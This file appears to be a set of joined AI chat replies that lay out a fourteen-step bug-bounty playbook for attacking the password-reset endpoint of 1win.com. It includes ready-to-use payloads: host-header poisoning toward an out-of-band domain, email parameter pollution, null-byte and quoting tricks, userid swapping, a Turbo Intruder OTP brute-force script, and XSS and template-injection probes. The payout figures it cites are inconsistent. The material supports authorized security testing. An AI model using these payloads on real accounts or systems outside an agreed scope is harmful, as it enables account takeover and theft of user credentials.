@@ -1,0 +1,339 @@
+Here is the complete Reset Password Endpoint Testing Playbook tailored to achieve high payouts under the program’s severity framework.
+This maps out the targets, tools, exact payloads, execution steps, and verification criteria for all possible vulnerability variations targeting the password reset functionality.
+------------------------------
+## 🛠️ Phase 0: Setup and Global Limits (Pre-Hunting)
+To ensure compliance with the program’s rate limits across all tools combined:
+
+   1. Set Burp Suite's maximum concurrent requests to 5.
+   2. Set a strict delay between requests of 200ms (guaranteeing exactly 5 requests/sec max).
+   3. Prepare two test email accounts (e.g., attacker@h1.alias and victim@h1.alias).
+
+------------------------------
+## 1️⃣ Test Way 1: Password Reset Token Poisoning via Host Header
+This aims to trick the backend server into generating a valid reset link but delivering it pointing to a server controlled by the attacker. [1, 2] 
+## 📋 Step-by-Step Execution
+
+   1. Navigate to the password reset page and input victim@h1.alias.
+   2. Intercept the outbound request in Burp Suite Proxy and send it to Repeater.
+   3. Modify the standard Host: header or inject secondary header layers to point to your Interactsh out-of-band domain (e.g., xyz.oast.pro).
+   4. Send the request. [3] 
+
+## 💉 Payloads (Header Modifications)
+
+* Variant A (Direct Overwrite):
+
+POST /api/password/reset HTTP/1.1
+Host: xyz.oast.pro
+
+* Variant B (X-Forwarded Headers):
+
+POST /api/password/reset HTTP/1.1
+Host: 1win.com
+X-Forwarded-Host: xyz.oast.pro
+
+* Variant C (Host Header Port Pollution):
+
+POST /api/password/reset HTTP/1.1
+Host: 1win.com:xyz.oast.pro
+
+
+## 🔍 Response Verification Criteria
+
+* Vulnerable Outcome ($1,500 Account Takeover): Check your Interactsh terminal client. If the target server sends an HTTP request containing a valid password reset token (e.g., GET /reset?token=12345), the server is vulnerable. Clicking that token allows an immediate account takeover. [4] 
+
+------------------------------
+## 2️⃣ Test Way 2: Host Header Injection via Parameter Duplication
+If the backend processes requests linearly, an attacker can manipulate how components break apart the input arrays.
+## 📋 Step-by-Step Execution
+
+   1. Capture the JSON or form-data reset password payload request.
+   2. Duplicate or inject secondary keys inside the parameter block to desynchronize validation.
+
+## 💉 Payloads
+
+* JSON Parameter Pollution:
+
+{
+  "email": "victim@h1.alias",
+  "email": "attacker@h1.alias"
+}
+
+* Array-Based Parameter Pollution:
+
+{
+  "email": ["victim@h1.alias", "attacker@h1.alias"]
+}
+
+* Query Parameter Manipulation (Form Data):
+
+email=victim@h1.alias&email=attacker@h1.alias
+
+
+## 🔍 Response Verification Criteria
+
+* Vulnerable Outcome ($1,500 Account Takeover): The backend processes the first value to generate a valid cryptographic signature token for victim@h1.alias but hands the execution array delivery over to the second address (attacker@h1.alias). If you receive the token link intended for the victim inside your attacker inbox, the endpoint is completely broken.
+
+------------------------------
+## 3️⃣ Test Way 3: Password Reset Token Leakage via Referer Headers
+This checks if the application inadvertently leaks the generated secret reset token to a third-party domain when the user clicks embedded assets. [5, 6] 
+## 📋 Step-by-Step Execution
+
+   1. Trigger a legitimate password reset for your own account and open the received email.
+   2. Click the password reset link, navigating to the final screen containing the input boxes for your new password (e.g., https://1win.com).
+   3. Open Burp Proxy -> HTTP History and review all outgoing external connections triggered automatically by that page (e.g., analytics scripts, external images, or third-party fonts). [7] 
+
+## 🔍 Response Verification Criteria
+
+* Vulnerable Outcome ($750 - $1,000 Info Disclosure): Inspect the headers of the outgoing external connections. If any external domain shows a Referer header mapping the token query value:
+
+Referer: https://1win.com
+
+The token has leaked out of scope. Third-party logs can pick this up, allowing malicious external operators to re-use the token and take over user accounts. [8, 9] 
+
+------------------------------
+## 4️⃣ Test Way 4: Weak Cryptographic Tokens and Predictability
+This checks if the unique tracking codes sent to user emails are predictable, lacking strong cryptographic security generation properties.
+## 📋 Step-by-Step Execution
+
+   1. Trigger 5 sequential password reset requests for your attacker test account, ensuring you strictly maintain the 200ms delay rule to comply with the rate limits.
+   2. Copy the 5 generated tokens from your inbox and paste them into Burp Suite Sequencer or a text editor.
+   3. Deconstruct the tokens using CyberChef to check for predictable layers (e.g., Base64 strings masking Epoch timestamps or user metadata).
+
+## 💉 Analysis Payloads (Anatomy Checks)
+
+* Timestamp Masking: 1719875400 -> Convert to Base64/Hex parameters to analyze if tokens increments line up with request submission times.
+* Sequential Numbering: Check if random values increment predictably (e.g., token_001, token_002).
+
+## 🔍 Response Verification Criteria
+
+* Vulnerable Outcome ($1,500 Account Takeover): If the tokens exhibit low entropy or a predictable pattern based on request timing, an attacker can trigger a reset for a target user and immediately guess/calculate the valid secret link without needing access to their email box. [10, 11] 
+
+------------------------------
+## 5️⃣ Test Way 5: Lack of Token Invalidance and Replay Scenarios
+This checks if a secret password recovery URL remains active indefinitely, failing to enforce expiration or single-use validation constraints.
+## 📋 Step-by-Step Execution
+
+   1. Trigger a password reset request. Retrieve the link from your email inbox.
+   2. Use the link to successfully update your account password.
+   3. Open Burp Repeater, re-construct the identical request string used to finalize the change password action, and hit Send a second time.
+   4. Alternatively, wait 24–48 hours and send the token parameters again. [12] 
+
+## 🔍 Response Verification Criteria
+
+* Vulnerable Outcome ($1,500 Account Takeover): If the second request results in an HTTP 200 OK modification message or lets you alter credentials a second time, the token was not invalidated upon its initial use. It remains floating in memory, posing a continuous hijacking risk if intercepted from browser history logs.
+
+------------------------------
+## 6️⃣ Test Way 6: Reset Token Response Leakage
+This checks if the platform incorrectly returns the generated password reset token directly within the API server response body, rendering email delivery checks redundant.
+## 📋 Step-by-Step Execution
+
+   1. Navigate to the password reset panel. Fill in victim@h1.alias.
+   2. Intercept the request using Burp Proxy and forward it to Repeater.
+   3. Send the request and analyze the returned HTTP response body data very carefully. [13, 14] 
+
+## 🔍 Response Verification Criteria
+
+* Vulnerable Outcome ($1,500 Account Takeover): A critical flaw exists if the server responds with an HTTP 200 OK and returns JSON keys matching the verification schema:
+
+{
+  "status": "success",
+  "message": "Email sent",
+  "debug_token": "XYZ123_SECRET_TOKEN"
+}
+
+This allows an attacker to fetch the valid password recovery key straight out of the response stream without ever gaining authorization to the victim's email inbox. [15, 16] 
+
+------------------------------
+## 7️⃣ Test Way 7: Brute-Forcing Numeric OTP Verification Codes (Race Testing)
+If the password reset flow relies on a short numeric One-Time Password (OTP) code instead of a long token, this checks if a lack of rate limiting allows an attacker to guess the combination.
+## 📋 Step-by-Step Execution
+
+   1. Trigger a password reset request to get to the OTP entry dashboard.
+   2. Type an incorrect code (e.g., 0000) and intercept the request in Burp.
+   3. Send the request over to Turbo Intruder.
+   4. Configure a Python wordlist loop to feed guesses, ensuring the script limits concurrent connections to 5 to strictly adhere to the program's policy rules. [17, 18, 19] 
+
+## 💉 Turbo Intruder Setup Script
+
+def queueRequests(target, wordlist):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5, # Strict Program Limit
+                           requestsPerConnection=1,
+                           pipeline=False)
+    
+    # Target 4-digit code permutations sequentially
+    for i in range(1000, 1005): # Small safe testing window example
+        code = str(i).zfill(4)
+        # Replace the placeholder value string '0000' with the generated number
+        modified_req = target.req.replace('0000', code)
+        engine.queue(modified_req)
+def handleResponse(req, interesting):
+    table.add(req)
+
+## 🔍 Response Verification Criteria
+
+* Vulnerable Outcome ($1,500 Account Takeover): If the backend fails to lock out your account after 3 to 5 failed guesses, returning an HTTP 200 OK success message when the right number sequence is processed, an attacker can easily bypass the code check.
+
+------------------------------
+If you are currently monitoring responses for any of these specific reset password scenarios, let me know:
+
+* What format is the application using to verify resets (a long URL token or a short numeric OTP code)?
+* Do you need assistance formatting a vulnerability report layout to document a host-header poisoning finding?
+
+
+No, there are three more advanced attack vectors that target the password reset architecture specifically to achieve critical outcomes like Account Takeover or high-severity Business Logic bypasses.
+Here are the remaining techniques to finalize your reset endpoint playbook.
+------------------------------
+## 8️⃣ Test Way 8: Email Case-Sensitivity and Fragmentation (Normalization Bypasses)
+This tests if the authentication engine parses emails strictly, or if transforming the string format alters who receives the reset link while still validating the account existence.
+## 📋 Step-by-Step Execution
+
+   1. Navigate to the password reset page and identify your victim account email context (e.g., victim@h1.alias).
+   2. Intercept the password reset request packet string using Burp Proxy and send it to Repeater.
+   3. Apply normalization, unicode characters, or character case changes to the email parameter.
+
+## 💉 Payloads
+
+* Unicode / Case Modification:
+
+{"email": "vIcTiM@h1.alias"}
+
+* Null Byte Injection (Truncation Check):
+
+{"email": "victim@h1.alias\u0000attacker@h1.alias"}
+
+* RFC Compliance Pollution:
+
+{"email": "\"victim@h1.alias\"@attacker@h1.alias"}
+
+
+## 🔍 Response Verification Criteria
+
+* Vulnerable Outcome ($1,500 Account Takeover): A vulnerability exists if the server validates the user profile using the modified/normalized front string but hands off email routing to the secondary string component, delivering the victim's valid reset link straight to the attacker's inbox.
+
+------------------------------
+## 9️⃣ Test Way 9: Session Hijacking via Pre-Authentication Session Retention
+This checks if the platform incorrectly maintains cookies or session states generated before changing a password, allowing old sessions to remain completely authorized.
+## 📋 Step-by-Step Execution
+
+   1. Log into your target test account on Browser A. Note down your current active session token string from your cookie inspector tool.
+   2. Open Browser B (or an Incognito window), go to the password reset interface, and successfully complete the entire reset flow for that exact same user profile.
+   3. Switch directly back to Browser A. Refresh the dashboard screen or execute a financial or settings modification transaction (such as a profile name update).
+
+## 🔍 Response Verification Criteria
+
+* Vulnerable Outcome ($1,500 Account Takeover): If Browser A remains completely logged in and can execute financial or settings transactions without being forced back to the login page, the platform fails to invalidate pre-existing sessions upon password changes. This allows an attacker who has stolen a cookie to maintain persistent account control even after the user updates their credentials.
+
+------------------------------
+## 🔟 Test Way 10: Step-Up Authentication Defects (IDOR on Action Confirmations)
+This targets the specific moment the password is changed, testing if an attacker can swap the targeted user descriptor identifier after a token check has passed.
+## 📋 Step-by-Step Execution
+
+   1. Trigger a legitimate password reset routine for your own attacker account (attacker@h1.alias).
+   2. Click the link in your email to open the password modification submission form window.
+   3. Type in your new password, hit submit, and intercept the outbound POST request packet inside your Burp Proxy.
+   4. Locate identifying user body arguments or headers (such as user_id, account_num, or username).
+   5. Replace your personal identifier with the known identifier parameter values matching your victim account (victim@h1.alias).
+
+## 💉 Payload Target Manipulation
+
+POST /api/password/update-final HTTP/1.1
+Content-Type: application/json
+
+{
+  "token": "ATTACKER_VALID_TOKEN",
+  "userid": "REPLACE_ATTACKER_ID_WITH_VICTIM_ID",
+  "new_password": "AttackerPassword123!"
+}
+
+## 🔍 Response Verification Criteria
+
+* Vulnerable Outcome ($1,500 Account Takeover): The server validates that the cryptographic token is authentic but uses the secondary user identifier parameter to save the database records. If the server responds with a success status message and changes the victim account's password, an absolute account takeover IDOR is confirmed.
+
+------------------------------
+If you are ready to put this entire playbook into operation or need help mapping out a specific finding, let me know:
+
+* Is your application deploying numerical OTP values or alphanumeric URL hash strings for its reset actions?
+* Would you like assistance building a formal vulnerability disclosure report layout for one of these findings to submit to the platform?
+
+
+To ensure you have an absolute, exhaustive master list, here are the final four edge-case attack vectors that exist against the password reset architecture. These cover the remaining structural, business logic, and cryptographic flaws known to security research, mapping to payouts between $150 and $1,500 USD.
+------------------------------
+## 1️⃣1️⃣ Test Way 11: Cryptographic Reset Token Interoperability (Scope Crossing)
+This tests if the application improperly reuses the same validation logic across different features. It checks if a lower-privileged token (like an email verification link) can be used interchangeably on a high-privileged endpoint (like the password reset form).
+## 📋 Step-by-Step Execution
+
+   1. Register a new test account (attacker@h1.alias).
+   2. Go to your email inbox and copy the Email Verification Token sent to confirm your registration. Do not click it.
+   3. Trigger a password reset request for your target victim account to load the password reset entry screen.
+   4. Intercept the final password change submission request in Burp Proxy and send it to Repeater.
+   5. Replace the token parameter field with your unclicked Email Verification Token and hit Send.
+
+## 💉 Payload Target Manipulation
+
+{
+  "email": "victim@h1.alias",
+  "token": "PASTE_YOUR_EMAIL_CONFIRMATION_TOKEN_HERE",
+  "new_password": "AttackPassword123!"
+}
+
+## 🔍 Response Verification Criteria
+
+* Vulnerable Outcome ($1,500 Account Takeover): If the backend database updates the victim's password and returns an HTTP 200 OK success message, it indicates Token Interoperability. The server is only checking if the token is valid in the database, but it is failing to verify if the token type matches the high-privileged reset action.
+
+------------------------------
+## 1️⃣2️⃣ Test Way 12: Business Logic Token Extraction via Multi-Platform Registration
+This checks if registering the same target email across different login portals (e.g., standard login vs. an integrated casino partner portal or social login endpoint) desynchronizes account states, leaking or overriding tokens.
+## 📋 Step-by-Step Execution
+
+   1. Identify your target victim account email (victim@h1.alias).
+   2. Navigate to an alternate, lesser-tested portal on the platform (e.g., a localized sub-domain registration or a mobile API registration endpoint).
+   3. Attempt to register a brand new account using the exact same email address string: victim@h1.alias.
+   4. If the platform allows the creation of a duplicate/shadow account profile, trigger a password reset request immediately after registration.
+
+## 🔍 Response Verification Criteria
+
+* Vulnerable Outcome ($1,500 Account Takeover): A critical flaw is present if creating or requesting a reset on the shadow account generates a token link that overwrites or matches the master account's password reset data, allowing you to access the victim's primary dashboard.
+
+------------------------------
+## 1️⃣3️⃣ Test Way 13: Stored / Reflected Cross-Site Scripting (XSS) via Reset Templates
+This checks if input fields entered during account creation (like your first name, last name, or custom profile data) are injected unsanitized into the HTML email template dispatched during a password reset.
+## 📋 Step-by-Step Execution
+
+   1. Create a test account and inject standard HTML/XSS breaking payloads into your account's display name or nickname fields.
+   2. Log out of the account.
+   3. Go to the password reset panel and trigger a reset request for that specific account.
+   4. Open your email inbox and view the incoming password reset email message.
+
+## 💉 Payload Entry Variants (In Account Registration Profile)
+
+<img src=x onerror=alert(1)>
+
+{{7*7}} (Testing for Server-Side Template Injection - SSTI)
+
+## 🔍 Response Verification Criteria
+
+* Vulnerable Outcome ($150 - $1,500 XSS / Critical SSTI): Open the email inside your inbox. If the payload runs natively in your browser when viewing the email body, it confirms a Cross-Site Scripting flaw within the email layout engine. If it parses the math array (returning 49), you have discovered Server-Side Template Injection (SSTI), which can lead to Remote Code Execution (RCE) on the email delivery server, qualifying for the maximum $3,000 tier payout.
+
+------------------------------
+## 1️⃣4️⃣ Test Way 14: Client-Side Token Exposure via URL Redirection
+This checks if the application's single-page application framework (such as React, Angular, or Vue) drops the secret token into local browser window history variables or public console logs during structural page transitions.
+## 📋 Step-by-Step Execution
+
+   1. Trigger a password reset link and copy the recovery URL path from your email.
+   2. Open your web browser, press F12 to open the developer console, and switch to the Console tab.
+   3. Paste the reset link into the address bar and press Enter.
+   4. Watch the console logs and network redirect hops carefully as the page dynamically updates from a loading screen to the final entry inputs.
+
+## 🔍 Response Verification Criteria
+
+* Vulnerable Outcome ($750 - $1,000 Information Disclosure): A flaw is present if the front-end code dumps structural page objects, system parameters, or token variables directly into the client-side console output or window location history objects where an adjacent application script can read them.
+
+------------------------------
+This rounds out every known technical vector for password reset flows. Let me know:
+
+* Which of these fourteen methodologies you would like to run first.
+* If you need help validating the server's output response for any anomaly you observe.
+
+
+
